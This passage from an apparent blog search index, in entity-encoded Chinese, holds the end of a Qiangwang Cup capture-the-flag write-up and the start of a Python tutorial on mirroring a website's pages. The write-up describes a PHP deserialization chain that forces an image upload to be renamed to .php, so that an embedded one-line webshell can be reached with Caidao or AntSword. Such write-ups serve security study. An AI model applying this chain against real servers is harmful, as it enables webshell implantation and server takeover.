&#x8FD9;&#x91CC;&#x5C31;&#x4F1A;&#x5C06;.png&#x540E;&#x7F00;&#x7684;&#x56FE;&#x7247;&#x4FEE;&#x6539;&#x4E3A;.php&#x5E76;&#x628A;&#x539F;&#x6765;&#x540E;&#x7F00;&#x4E3A;.png&#x7684;&#x56FE;&#x7247;&#x5220;&#x9664;&#x3002;&#x8FD9;&#x6837;&#x5C31;&#x53EF;&#x4EE5;&#x5728;&#x56FE;&#x7247;&#x4E2D;&#x5199;&#x5165;&#x4E00;&#x53E5;&#x8BDD;&#x8FDB;&#x800C;getshell&#x3002; &#x800C;&#x8981;&#x91CD;&#x5B9A;&#x4E49;&#x8FD9;&#x4E24;&#x4E2A;&#x53D8;&#x91CF;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x5F97;&#x8C03;&#x7528;upload_img&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x5E76;&#x4E14;&#x7ED5;&#x8FC7;&#x4FEE;&#x6539;&#x540E;&#x7F00;&#x540D;&#x548C;&#x5224;&#x65AD;&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x4FEE;&#x6539;&#x6210;&#x529F;&#x8FD9;&#x4E24;&#x4E2A;if&#x8BED;&#x53E5;&#x3002; &#x5F53;&#x6211;&#x4EEC;&#x8FD8;&#x672A;&#x4E0A;&#x4F20;&#x56FE;&#x7247;&#x65F6;&#xFF0C;if(!empty($_FILES))&#x662F;&#x76F4;&#x63A5;&#x53EF;&#x4EE5;&#x7ED5;&#x8FC7;&#x7684;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x4E0D;&#x4F1A;&#x6267;&#x884C;ext_check()&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x3002;&#x6211;&#x4EEC;&#x518D;&#x5229;&#x7528;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5C06;$ext&#x8D4B;&#x503C;&#x4E3A;1&#x3002;&#x5C31;&#x53EF;&#x4EE5;&#x7ED5;&#x8FC7;&#x8FD9;&#x4E24;&#x4E2A;if&#x8BED;&#x53E5;&#x4E86;&#x3002; &#x90A3;&#x4E48;&#x95EE;&#x9898;&#x6765;&#x4E86;&#xFF0C;&#x600E;&#x4E48;&#x8C03;&#x7528;upload_img&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x5462;&#xFF1F;&#x6211;&#x4EEC;&#x77E5;&#x9053;&#xFF0C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x662F;&#x4E0D;&#x80FD;&#x591F;&#x76F4;&#x63A5;&#x8C03;&#x7528;&#x7C7B;&#x91CC;&#x9762;&#x7684;&#x51FD;&#x6570;&#x7684;&#x3002; &#x8FD8;&#x8BB0;&#x5F97;&#x524D;&#x9762;&#x7684;&#x4E24;&#x4E2A;&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x5417;&#xFF1F; &#x4ECE;payload&#x811A;&#x672C;&#x5F53;&#x4E2D;&#x770B;&#xFF0C;&#x6211;&#x4EEC;&#x5C06;$this-&gt;checker&#x8D4B;&#x503C;&#x4E3A;Profile&#x8FD9;&#x4E2A;&#x7C7B;&#x3002; &#x9875;&#x9762;Register.php&#x5728;&#x8C03;&#x7528;$this-&gt;checker&#x65F6;&#x7684;&#x8BED;&#x53E5;&#x4E3A;&#xFF1A; 123456public function __destruct(){ if(!$this-&gt;registed){ $this-&gt;checker-&gt;index(); }} &#x8FD9;&#x91CC;&#x8C03;&#x7528;&#x4E86;$this-&gt;checker-&gt;index();&#x4E5F;&#x5C31;&#x662F;&#x4ECE;Profile&#x7C7B;&#x4E2D;&#x8C03;&#x7528;&#x4E86;index()&#xFF0C;&#x800C;Profile&#x7C7B;&#x4E2D;&#x5E76;&#x6CA1;&#x6709;index()&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x3002; &#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x5C31;&#x4F1A;&#x89E6;&#x53D1;&#x5230;&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x4E2D;&#x7684;__call() &#x5728;call&#x65B9;&#x6CD5;&#x4E2D;&#xFF0C;&#x4F1A;&#x8C03;&#x7528;&#x540D;&#x4E3A;&#x53D8;&#x91CF;index&#x7684;&#x503C;&#x7684;&#x65B9;&#x6CD5;&#x3002;&#x800C;Profile&#x7C7B;&#x4E2D;&#x6CA1;&#x6709;index&#x8FD9;&#x4E2A;&#x53D8;&#x91CF;&#xFF0C;&#x6240;&#x4EE5;&#x53C8;&#x4F1A;&#x89E6;&#x53D1;__get()&#x8FD9;&#x4E2A;&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x3002; &#x5728;get&#x65B9;&#x6CD5;&#x4E2D;&#xFF0C;&#x4F1A;&#x8FD4;&#x56DE;except[&#x2018;index&#x2019;]&#x7684;&#x503C;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5728;&#x6784;&#x9020;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x5C31;&#x5C06;&#x5176;&#x8D4B;&#x503C;&#x4E3A;upload_img&#x3002; &#x8FD9;&#x6837;&#xFF0C;&#x5C31;&#x4F1A;&#x8C03;&#x7528;upload_img&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x4E86;&#x3002; &#x6700;&#x7EC8;&#x7684;&#x6B65;&#x9AA4;&#x5C31;&#x662F;&#xFF1A; &#x8BBE;&#x7F6E;$register=0 &#x8C03;&#x7528;Profile&#x7C7B; &#x8BBE;&#x7F6E;except&#x6570;&#x7EC4;&#xFF0C;index-&gt;upload_img &#x8BBE;&#x7F6E;$ext=1&#xFF0C;$filename,$filename_tmp &#x7531;2&#x89E6;&#x53D1;call&#xFF0C;call&#x8C03;&#x7528;get&#xFF0C;call&#x6700;&#x7EC8;&#x8C03;&#x7528;upload_img&#x51FD;&#x6570; &#x4FEE;&#x6539;&#x6587;&#x4EF6;&#x540D; &#x83DC;&#x5200;&#x8FDE;&#x63A5; &#x590D;&#x73B0;&#x6CE8;&#x518C;&#x4E00;&#x4E2A;&#x8D26;&#x53F7;&#xFF0C;&#x4E0A;&#x4F20;&#x4E00;&#x4E2A;&#x5305;&#x542B;php&#x4E00;&#x53E5;&#x8BDD;&#x7684;&#x56FE;&#x7247;&#xFF0C;&#x5C06;&#x811A;&#x672C;&#x4E2D;&#x7684;&#x56FE;&#x7247;&#x540D;&#x4FEE;&#x6539;&#x4E3A;&#x4E0A;&#x4F20;&#x540E;&#x751F;&#x6210;&#x7684;&#x56FE;&#x7247;&#x540D;&#x3002; &#x6CE8;&#x518C;&#x4E00;&#x4E2A;&#x65B0;&#x8D26;&#x53F7;&#xFF0C;&#x767B;&#x5F55;&#x3002;&#x5C06;payload&#x751F;&#x6210;&#x51FA;&#x6765;&#xFF0C;&#x5728;&#x7528;&#x6237;&#x4E3B;&#x9875;&#x4FEE;&#x6539;cookies&#xFF0C;&#x5237;&#x65B0;&#x3002; &#x7528;&#x83DC;&#x5200;&#x6216;&#x8005;&#x8681;&#x5251;&#x8FDE;&#x63A5;&#x56FE;&#x7247;&#x540D;.php&#xFF0C;&#x5728;&#x6839;&#x76EE;&#x5F55;&#x4E0B;&#x62FF;&#x5230;flag&#x3002; &#x603B;&#x7ED3;&#x5B66;&#x957F;&#x4EEC;&#x7684;&#x601D;&#x8DEF;&#x771F;&#x7684;&#x592A;&#x5F3A;&#x4E86;&#xFF0C;&#x6BCF;&#x4E2A;&#x91CD;&#x8981;&#x7684;&#x8BED;&#x53E5;&#xFF0C;&#x73AF;&#x73AF;&#x76F8;&#x6263;&#x8FBE;&#x5230;&#x6700;&#x7EC8;&#x5F7C;&#x5CB8;&#x3002; &#x6700;TP5&#x8FD9;&#x7C7B;&#x6846;&#x67B6;&#x8FD8;&#x662F;&#x4E0D;&#x592A;&#x719F;&#x6089;&#xFF0C;&#x540E;&#x9762;&#x8FD8;&#x8981;&#x591A;&#x603B;&#x7ED3;&#x5B66;&#x4E60;&#x3002;","link":"/2019/05/26/强网杯upload Writeup与简单分析/"},{"title":"Python之如何优雅的复制一个网站的所有页面","text":"&#x8BF4;&#x5728;&#x524D;&#x9762;&#x5728;&#x4E1A;&#x5185;&#x7531;&#x4E8E;&#x67D0;&#x4E9B;&#x4E0D;&#x53EF;&#x6297;&#x529B;&#x7684;&#x56E0;&#x7D20;&#xFF0C;&#x6211;&#x4EEC;&#x4E0D;&#x5F97;&#x4E0D;&#x53BB;&#x505A;&#x4E00;&#x4E9B;&#x9EBB;&#x70E6;&#x7684;&#x4E8B;&#x60C5;&#x6765;&#x5907;&#x4EFD;&#x8D44;&#x6599;&#x3002;&#x4E3A;&#x4E86;&#x5C3D;&#x6700;&#x5927;&#x53EF;&#x80FD;&#x633D;&#x7559;&#x90A3;&#x4E9B;&#x77E5;&#x8BC6;&#xFF0C;&#x4E5F;&#x5C31;&#x6709;&#x4E86;&#x8FD9;&#x7BC7;&#x6587;&#x7AE0;&#x548C;&#x6700;&#x540E;&#x7684;&#x811A;&#x672C;&#x3002;(&#x6587;&#x7AE0;&#x548C;&#x811A;&#x672C;&#x5199;&#x7684;&#x90FD;&#x5F02;&#x5E38;&#x7C97;&#x7CD9;&#xFF0C;&#x5E0C;&#x671B;&#x5E08;&#x5085;&#x4EEC;&#x4E0D;&#x8981;&#x4ECB;&#x610F;&#x3002;) &#x5173;&#x4E8E;&#x7F51;&#x7AD9;&#x590D;&#x5236;&#xFF1A; &#x7F51;&#x7AD9;&#x590D;&#x5236;&#xFF0C;&#x4E5F;&#x53EF;&#x79F0;&#x4E3A;&#x7F51;&#x7AD9;&#x5907;&#x4EFD;&#x3002;&#x662F;&#x901A;&#x8FC7;&#x5DE5;&#x5177;&#x5C06;&#x7F51;&#x9875;&#x4E0A;&#x7684;&#x5185;&#x5BB9;&#x5168;&#x90E8;&#x4FDD;&#x5B58;&#x4E0B;&#x6765;&#x3002;&#x5F53;&#x7136;&#x4E0D;&#x4EC5;&#x4EC5;&#x53EA;&#x662F;&#x4FDD;&#x5B58;&#x4E86;&#x4E00;&#x4E2A;html&#x9875;&#x9762;&#xFF0C;&#x800C;&#x662F;&#x5C06;&#x7F51;&#x9875;&#x6E90;&#x7801;&#x5185;&#x6240;&#x5305;&#x542B;&#x7684;css&#x3001;js&#x548C;&#x9759;&#x6001;&#x6587;&#x4EF6;&#x7B49;&#x5168;&#x90E8;&#x4FDD;&#x5B58;&#xFF0C;&#x4EE5;&#x5728;&#x672C;&#x5730;&#x4E5F;&#x53EF;&#x4EE5;&#x5B8C;&#x6574;&#x7684;&#x6D4F;&#x89C8;&#x6574;&#x4E2A;&#x7F51;&#x7AD9;&#x3002;&#x7F51;&#x7EDC;&#x4E0A;&#x4E5F;&#x6709;&#x4E00;&#x4E9B;&#x7C7B;&#x4F3C;&#x7684;&#x5DE5;&#x5177;&#xFF0C;&#x4F46;&#x4F7F;&#x7528;&#x8D77;&#x6765;&#x5E76;&#x4E0D;&#x7406;&#x60F3;&#x3002;&#x4E8E;&#x662F;&#x6211;&#x6253;&#x7B97;&#x81EA;&#x5DF1;&#x5199;&#x4E00;&#x4E2A;Python&#x811A;&#x672C;&#xFF0C;&#x65B9;&#x4FBF;&#x4E2A;&#x4EBA;&#x5BF9;&#x7F51;&#x7AD9;&#x7684;&#x5907;&#x4EFD;&#xFF0C;&#x4E5F;&#x65B9;&#x4FBF;&#x4E00;&#x4E9B;&#x7F51;&#x7EDC;&#x8D44;&#x6599;&#x7684;&#x6536;&#x96C6;&#x3002; &#x5904;&#x7406;&#x5E76;&#x4FDD;&#x5B58;&#x5355;&#x4E2A;&#x9875;&#x9762;&#x7F51;&#x7AD9;&#x590D;&#x5236;&#x4E4B;&#x9700;&#x8981;&#x4FDD;&#x5B58;&#x7684;&#x5185;&#x5BB9;&#x5728;&#x5F00;&#x59CB;&#x52A8;&#x624B;&#x5199;&#x4EE3;&#x7801;&#x4E4B;&#x524D;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x786E;&#x5B9A;&#x4E00;&#x4E0B;&#x8981;&#x4FDD;&#x5B58;&#x4E0B;&#x6765;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x4EE5;&#x4FBF;&#x540E;&#x671F;&#x7F16;&#x5199;&#x811A;&#x672C;&#x6765;&#x5904;&#x7406;&#x3002; &#x6682;&#x4E14;&#x5206;&#x4E3A;&#x8FD9;&#x4E48;&#x4E24;&#x4E2A;&#x90E8;&#x5206;&#xFF1A; &#x7F51;&#x9875;&#x6E90;&#x7801;(&#x5355;&#x4E2A;&#x9875;&#x9762;&#x7684;html&#x6E90;&#x7801;) css&#x3001;js&#x4E0E;&#x56FE;&#x7247;&#x6587;&#x4EF6;(&#x9759;&#x6001;&#x6587;&#x4EF6;) css&#x3001;js&#x4E0E;&#x56FE;&#x7247;&#x6587;&#x4EF6;&#x7684;&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#x90FD;&#x662F;&#x4ECE;&#x7F51;&#x9875;&#x6E90;&#x7801;&#x4E2D;&#x83B7;&#x53D6;&#x5F97;&#x5230;&#x7684;&#xFF0C;&#x5982;&#x56FE;&#xFF1A; &#x5185;&#x5BB9;&#x4F3C;&#x4E4E;&#x4E0D;&#x662F;&#x5F88;&#x591A;&#xFF0C;&#x5C31;&#x53EA;&#x9700;&#x8981;&#x628A;&#x9759;&#x6001;&#x6587;&#x4EF6;&#x7684;&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#x4ECE;&#x7F51;&#x9875;&#x6E90;&#x7801;&#x4E2D;&#x63D0;&#x53D6;&#x51FA;&#x6765;&#x7136;&#x540E;&#x4E0B;&#x8F7D;&#x4FDD;&#x5B58;&#x5C31;&#x884C;&#x4E86;&#x3002;&#x4F46;&#x662F;&#x5B9E;&#x9645;&#x60C5;&#x51B5;&#x4F1A;&#x6BD4;&#x8F83;&#x9EBB;&#x70E6;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x5462;&#xFF1F; &#x4E0B;&#x56FE;&#x662F;&#x4E00;&#x4E2A;&#x9759;&#x6001;&#x6587;&#x4EF6;&#x7684;&#x4FDD;&#x5B58;&#x8FC7;&#x7A0B;&#xFF0C;&#x6587;&#x4EF6;&#x5728;&#x4E0B;&#x8F7D;&#x4FDD;&#x5B58;&#x4E4B;&#x524D;&#x8FD8;&#x9700;&#x8981;&#x5904;&#x7406;&#x76F8;&#x5BF9;&#x5730;&#x5740;&#x8FDB;&#x800C;&#x5F97;&#x5230;&#x6587;&#x4EF6;&#x7684;&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#x4EE5;&#x53CA;&#x4FDD;&#x5B58;&#x5230;&#x672C;&#x5730;&#x7684;&#x8DEF;&#x5F84;&#x3002;&#x9664;&#x6B64;&#x4E4B;&#x5916;&#xFF0C;&#x8FD8;&#x8981;&#x5BF9;HTML&#x6E90;&#x7801;&#x4E2D;&#x539F;&#x6765;&#x7684;&#x76F8;&#x5BF9;&#x5730;&#x5740;&#x8FDB;&#x884C;&#x66FF;&#x6362;&#xFF0C;&#x8BA9;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x5728;&#x672C;&#x5730;&#x4E5F;&#x80FD;&#x591F;&#x6B63;&#x5E38;&#x7684;&#x4F7F;&#x7528;&#x5E76;&#x663E;&#x793A;&#x3002;&#x8FD9;&#x4E5F;&#x662F;&#x4FDD;&#x5B58;&#x7F51;&#x9875;&#x76F8;&#x5BF9;&#x6765;&#x8BF4;&#x590D;&#x6742;&#x7684;&#x5730;&#x65B9;&#xFF0C;&#x5728;&#x83B7;&#x53D6;&#x94FE;&#x63A5;&#x4E4B;&#x540E;&#x6211;&#x4EEC;&#x6765;&#x770B;&#x770B;&#x5982;&#x4F55;&#x5904;&#x7406;&#x8FD9;&#x4E2A;&#x60C5;&#x51B5;&#x3002; &#x7F51;&#x7AD9;&#x590D;&#x5236;&#x4E4B;&#x94FE;&#x63A5;&#x7684;&#x63D0;&#x53D6;&#x6709;&#x4E86;&#x4E00;&#x4E2A;&#x9875;&#x9762;&#x7684;&#x94FE;&#x63A5;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8FD9;&#x4E2A;&#x94FE;&#x63A5;&#x83B7;&#x53D6;HTML&#x6E90;&#x7801;&#x8FDB;&#x800C;&#x83B7;&#x53D6;&#x5404;&#x7C7B;&#x6587;&#x4EF6;&#x7684;&#x76F8;&#x5BF9;&#x5730;&#x5740;&#x3002;&#x76F8;&#x8F83;&#x4E8E;&#x8DEF;&#x5F84;&#x5904;&#x7406;&#xFF0C;&#x8FD9;&#x91CC;&#x7684;&#x65B9;&#x5F0F;&#x5C31;&#x7B80;&#x5355;&#x76F4;&#x63A5;&#x5F88;&#x591A;&#x3002;&#x7528;beautifulsoup&#x76F4;&#x63A5;&#x83B7;&#x53D6;&#x6807;&#x7B7E;&#xFF0C;&#x518D;&#x83B7;&#x53D6;&#x94FE;&#x63A5;&#x5373;&#x53EF;&#x3002;&#x8FC7;&#x7A0B;&#x5982;&#x56FE;&#xFF1A; &#x901A;&#x8FC7;&#x6784;&#x9020;&#x4E00;&#x4E2A;ExtractLinks()&#x51FD;&#x6570;&#x6765;&#x83B7;&#x53D6;&#x4E00;&#x4E2A;&#x7F51;&#x9875;&#x5185;&#x6240;&#x6709;&#x540C;&#x7C7B;&#x6807;&#x7B7E;&#x7684;&#x540C;&#x79CD;&#x53C2;&#x6570;&#x3002;&#x53EF;&#x4EE5;&#x8282;&#x7701;&#x4E00;&#x4E9B;&#x91CD;&#x590D;&#x7684;&#x8BED;&#x53E5;&#xFF0C;&#x65B9;&#x9762;&#x83B7;&#x53D6;&#x5230;css&#x3001;js&#x3001;img&#x3001;a&#x6807;&#x7B7E;&#x7684;url&#x5730;&#x5740;&#x3002; &#x8FD9;&#x91CC;&#x7684;&#x8FC7;&#x6EE4;&#x7684;&#x5185;&#x5BB9;&#x5982;&#x4E0B;&#xFF1A; &#x53BB;&#x91CD;&#x590D; &#x4E22;&#x5F03;&#x65E0;&#x6548;url&#x5730;&#x5740;&#x5982;&#xFF1A;#&#x3001;javascript&#x4F2A;&#x534F;&#x8BAE;&#x7B49; &#x90A3;&#x83B7;&#x53D6;&#x4E86;&#x94FE;&#x63A5;&#x4E4B;&#x540E;&#x5C31;&#x9700;&#x8981;&#x5BF9;&#x8DEF;&#x5F84;&#x8FDB;&#x884C;&#x5904;&#x7406;&#x4E86;&#x3002; &#x7F51;&#x7AD9;&#x590D;&#x5236;&#x4E4B;&#x8DEF;&#x5F84;&#x7684;&#x5904;&#x7406;&#x5728;&#x7F51;&#x9875;&#x6E90;&#x7801;&#x5F53;&#x4E2D;&#xFF0C;&#x76F8;&#x5BF9;&#x5730;&#x5740;&#x7684;&#x5F62;&#x5F0F;&#x6709;&#x5F88;&#x591A;&#x79CD;&#x60C5;&#x51B5;&#x3002; &#x9700;&#x8981;&#x6B63;&#x5E38;&#x5E94;&#x5BF9;&#x7684;&#x76F8;&#x5BF9;&#x5730;&#x5740;&#x5F62;&#x5F0F;&#x6709;&#x591A;&#x5C11;&#x79CD;&#x5462;&#xFF1F; &#x7528;&#x56FE;&#x7247;&#x6587;&#x4EF6;&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x4F8B;&#x5B50;&#xFF0C;&#x7B80;&#x5355;&#x603B;&#x7ED3;&#x4E86;&#x4E00;&#x4E9B;&#x5982;&#x4E0B;&#xFF1A; &#x9875;&#x9762;&#x5730;&#x5740; &#x6E90;&#x7801;&#x4E2D;&#x5730;&#x5740; &#x4E0B;&#x8F7D;&#x5730;&#x5740; 1 https://example.com/c/d/a.html None None 2 https://example.com/c/d/a.html # None 3 https://example.com/c/d/a.html test/a.jpg https://example.com/c/d/test/a.jpg 4 https://example.com/c/d/a.html ./test/a.jpg https://example.com/c/d/test/a.jpg 5 https://example.com/c/d/a.html ../a.jpg https://example.com/c/a.jpg 6 https://example.com/c/d/a.html //example.com/a.jpg https://example.com/a.jpg 7 https://example.com/c/d/a.html https://example.com/a.jpg https://example.com/a.jpg 8 https://example.com/c/d/a.html /test?id=1 https://example.com/test?id=1 9 https://example.com/c/d/a.html /./a.jpg https://example.com/a.jpg 10 https://example.com/c/d/a.html data:image/png;base64,&#x2026; data:image/png;base64,&#x2026; (&#x5728;&#x786E;&#x5B9A;&#x7684;&#x5F62;&#x5F0F;&#x4E4B;&#x5916;&#x53C8;&#x4F1A;&#x6709;&#x5F88;&#x591A;&#x79CD;&#x6211;&#x4EEC;&#x4E0D;&#x80FD;&#x9884;&#x6D4B;&#x7684;&#x60C5;&#x51B5;&#x3002;&#x5BF9;&#x4E8E;&#x90A3;&#x4E9B;&#x4E0D;&#x786E;&#x5B9A;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x5C31;&#x76F4;&#x63A5;&#x4F5C;&#x4E22;&#x5F03;&#x5904;&#x7406;&#x3002;) &#x4ECE;&#x76F8;&#x5BF9;&#x5730;&#x5740;&#x7684;&#x7C7B;&#x578B;&#x4E5F;&#x80FD;&#x770B;&#x51FA;&#x6765;&#xFF0C;&#x8981;&#x5199;&#x5904;&#x7406;&#x7684;&#x4EE3;&#x7801;&#x7684;&#x8BDD;&#x4F1A;&#x6709;&#x5F88;&#x591A;&#x4E0D;&#x540C;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x6BCF;&#x79CD;&#x60C5;&#x51B5;&#x57FA;&#x672C;&#x90FD;&#x9700;&#x8981;&#x8FDB;&#x884C;&#x5355;&#x72EC;&#x7684;&#x5904;&#x7406;&#xFF0C;&#x5E76;&#x4E14;&#x5176;&#x4E2D;&#x7684;&#x903B;&#x8F91;&#x4E5F;&#x662F;&#x7A0D;&#x5FAE;&#x6709;&#x70B9;&#x7ED5;&#x3002; &#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x5EFA;&#x7ACB;&#x4E00;&#x4E2A;ProcessResourcePath&#x7684;&#x51FD;&#x6570;&#x6765;&#x5904;&#x7406;&#x6587;&#x4EF6;&#x76F8;&#x5BF9;&#x5730;&#x5740;&#x7684;&#x5173;&#x7CFB; &#x5904;&#x7406;&#x94FE;&#x63A5;&#x65F6;&#x9700;&#x8981;&#x7684;&#x4F20;&#x5165;&#x53C2;&#x6570;&#xFF1A; &#x9875;&#x9762;&#x5730;&#x5740;&#xFF1A;&#x7528;&#x4E8E;&#x83B7;&#x53D6;&#x6E90;&#x7801;&#x4E2D;&#x7684;&#x6587;&#x4EF6;&#x5730;&#x5740;&#xFF0C;&#x5E76;&#x6839;&#x636E;url&#x7684;&#x5C42;&#x7EA7;&#x5173;&#x7CFB;&#x786E;&#x5B9A;&#x56FE;&#x7247;&#x4FDD;&#x5B58;&#x7684;&#x8DEF;&#x5F84;&#x3002; &#x56FE;&#x7247;&#x5730;&#x5740;&#xFF1A;&#x6839;&#x636E;&#x9875;&#x9762;&#x5730;&#x5740;&#x4E0E;&#x56FE;&#x7247;&#x5730;&#x5740;&#x786E;&#x5B9A;&#x56FE;&#x7247;&#x7684;&#x4E0B;&#x8F7D;&#x5730;&#x5740; &#x8FD4;&#x56DE;&#x7684;&#x53C2;&#x6570;&#xFF1A; &#x9875;&#x9762;&#x5730;&#x5740; &#x56FE;&#x7247;&#x5730;&#x5740; &#x56FE;&#x7247;&#x7684;&#x4E0B;&#x8F7D;&#x5730;&#x5740; &#x66FF;&#x6362;&#x7684;&#x56FE;&#x7247;&#x5730;&#x5740; &#x4FDD;&#x5B58;&#x7684;&#x8DEF;&#x5F84; &#x56FE;&#x7247;&#x5730;&#x5740;&#x7684;&#x7C7B;&#x578B;(&#x65B9;&#x4FBF;DEBUG) &#x51FD;&#x6570;&#x5904;&#x7406;&#x7684;&#x8FC7;&#x7A0B;&#x5982;&#x56FE;&#xFF1A; &#x51FD;&#x6570;&#x89E3;&#x91CA;&#xFF1A; Md5Encrypt(): &#x662F;&#x7528;&#x4F5C;&#x5BF9;&#x7AD9;&#x5916;&#x6587;&#x4EF6;&#x7684;&#x4E0B;&#x8F7D;&#x94FE;&#x63A5;&#x8FDB;&#x884C;MD5&#x52A0;&#x5BC6;&#xFF0C;&#x9632;&#x6B62;&#x91CD;&#x590D;&#x4E0B;&#x8F7D; GetUrlPart(): &#x7528;&#x4E8E;&#x83B7;&#x53D6;url&#x4E2D;&#x4E0D;&#x540C;&#x90E8;&#x5206;&#x7684;&#x503C;&#xFF0C;&#x65B9;&#x4FBF;&#x5BF9;url&#x7684;&#x5904;&#x7406; ProcessResourcePath(): &#x5904;&#x7406;&#x9875;&#x9762;&#x5730;&#x5740;&#x548C;&#x56FE;&#x7247;&#x5730;&#x5740;&#x7684;&#x76F8;&#x5BF9;&#x5173;&#x7CFB; URL&#x5C42;&#x7EA7;&#x5173;&#x7CFB;&#x7684;&#x5904;&#x7406;&#x5C31;&#x4E0D;&#x89E3;&#x91CA;&#x4E86;&#xFF0C;&#x6BD4;&#x8F83;&#x9EBB;&#x70E6;&#x3002;&#x5982;&#x679C;&#x6709;&#x5BF9;&#x5355;&#x4E2A;&#x8FC7;&#x7A0B;&#x611F;&#x5174;&#x8DA3;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8DDF;&#x6211;&#x4EA4;&#x6D41;&#x5594;&#x3002; &#x901A;&#x8FC7;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x7684;&#x5904;&#x7406;&#x4E4B;&#x540E;&#xFF0C;&#x4FDD;&#x5B58;&#x7F51;&#x9875;&#x65F6;&#x5C31;&#x53D8;&#x5F97;&#x975E;&#x5E38;&#x65B9;&#x4FBF;&#x3002;&#x56E0;&#x4E3A;&#x4F60;&#x53EA;&#x9700;&#x8981;&#x5C06;css&#x3001;js&#x3001;&#x56FE;&#x7247;&#x7B49;&#x6587;&#x4EF6;&#x7684;&#x94FE;&#x63A5;&#x63D0;&#x53D6;&#x51FA;&#x6765;&#x8FDB;&#x884C;&#x5904;&#x7406;&#xFF0C;&#x5C06;&#x5904;&#x7406;&#x5B8C;&#x7684;&#x5730;&#x5740;&#x8FDB;&#x884C;&#x66FF;&#x6362;&#x5373;&#x53EF;&#x3002; &#x7F51;&#x7AD9;&#x590D;&#x5236;&#x4E4B;&#x5355;&#x4E2A;&#x9875;&#x9762;&#x7684;&#x5904;&#x7406;&#x4E0E;&#x4FDD;&#x5B58;&#x90A3;&#x5728;&#x4FDD;&#x5B58;&#x5355;&#x4E2A;&#x9875;&#x9762;&#x4E4B;&#x524D;&#xFF0C;&#x9700;&#x8981;&#x5F80;&#x524D;&#x601D;&#x8003;&#x4E00;&#x70B9;&#x3002;&#x6700;&#x7EC8;&#x7684;&#x6587;&#x4EF6;&#x90FD;&#x662F;&#x8981;&#x4FDD;&#x5B58;&#x5230;&#x4E00;&#x4E2A;&#x603B;&#x6587;&#x4EF6;&#x5939;&#x91CC;&#xFF0C;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x5939;&#x7684;&#x540D;&#x5B57;&#x5F97;&#x63D0;&#x524D;&#x786E;&#x5B9A;&#x3002;&#x6211;&#x8FD9;&#x91CC;&#x60F3;&#x628A;&#x4E00;&#x4E2A;&#x7F51;&#x7AD9;&#x4FDD;&#x5B58;&#x5230;&#x4EE5;&#x57DF;&#x540D;&#x4E3A;&#x540D;&#x79F0;&#x7684;&#x6587;&#x4EF6;&#x5939;&#x4E2D;&#xFF0C;&#x6BD4;&#x5982; www.bilibili.com &#x7684;&#x6240;&#x6709;&#x9875;&#x9762;&#x548C;&#x8D44;&#x6E90;&#x5C31;&#x5168;&#x90E8;&#x4FDD;&#x5B58;&#x5230;www_bilibili_com&#x7684;&#x6587;&#x4EF6;&#x5939;&#x91CC;&#x3002;&#x6240;&#x4EE5;&#xFF0C;&#x4FDD;&#x5B58;&#x5355;&#x4E2A;&#x9875;&#x9762;&#x6240;&#x9700;&#x8981;&#x7684;&#x53C2;&#x6570;&#x5C31;&#x4E3A;&#x9875;&#x9762;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x518D;&#x901A;&#x8FC7;&#x9875;&#x9762;&#x7684;&#x5730;&#x5740;&#x83B7;&#x53D6;&#x57DF;&#x540D;&#x6765;&#x5B9A;&#x4E49;&#x4FDD;&#x5B58;&#x7684;&#x6587;&#x4EF6;&#x5939;&#x3002; &#x4FDD;&#x5B58;&#x7684;&#x65F6;&#x5019;&#x9700;&#x8981;&#x5C06;&#x9875;&#x9762;html&#x6E90;&#x7801;&#x4E2D;&#x7684;&#x5730;&#x5740;&#x8FDB;&#x884C;&#x66FF;&#x6362;&#x3002; &#x6587;&#x4EF6;&#x5730;&#x5740;&#x66FF;&#x6362; &#x6587;&#x4EF6;&#x548C;&#x9875;&#x9762;&#x90FD;&#x76F4;&#x63A5;&#x4FDD;&#x5B58;&#x4E0B;&#x6765;&#x4E86;&#xFF0C;&#x8BE5;&#x600E;&#x4E48;&#x8BA9;&#x9875;&#x9762;&#x53EF;&#x4EE5;&#x6B63;&#x5E38;&#x8C03;&#x7528;&#x672C;&#x5730;&#x7684;js&#x548C;&#x663E;&#x793A;&#x672C;&#x5730;&#x7684;&#x56FE;&#x7247;&#x5462;&#xFF1F;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x505A;&#x7684;&#x5C31;&#x662F;&#x5C06;&#x9875;&#x9762;&#x4E2D;&#x7684;&#x6587;&#x4EF6;&#x5730;&#x5740;&#x90FD;&#x8FDB;&#x884C;&#x66FF;&#x6362;&#x3002; 